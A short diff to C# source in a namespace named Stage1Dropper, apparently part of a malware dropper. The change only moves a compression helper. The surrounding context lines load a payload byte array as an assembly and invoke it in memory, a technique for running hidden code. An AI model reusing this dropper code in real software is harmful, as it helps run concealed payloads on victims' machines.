@@ -110,7 +110,17 @@ namespace Stage1Dropper
             MethodInfo target = Assembly.Load(payload).EntryPoint;
             target.Invoke(null, null);
         }
-
+        
+        public static byte[] Compress(byte[] data)
+        {
+            MemoryStream output = new MemoryStream();
+            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
+            {
+                dstream.Write(data, 0, data.Length);
+            }
+            return output.ToArray();
+        }
+        
         public static byte[] Decompress(byte[] data)
         {
             MemoryStream input = new MemoryStream(data);
@@ -152,15 +162,7 @@ namespace Stage1Dropper
             }
             return data;
         }
-        private static byte[] Compress(byte[] data)
-        {
-            MemoryStream output = new MemoryStream();
-            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
-            {
-                dstream.Write(data, 0, data.Length);
-            }
-            return output.ToArray();
-}
+        
         [StructLayout(LayoutKind.Sequential)]
         public class WnfType
         {
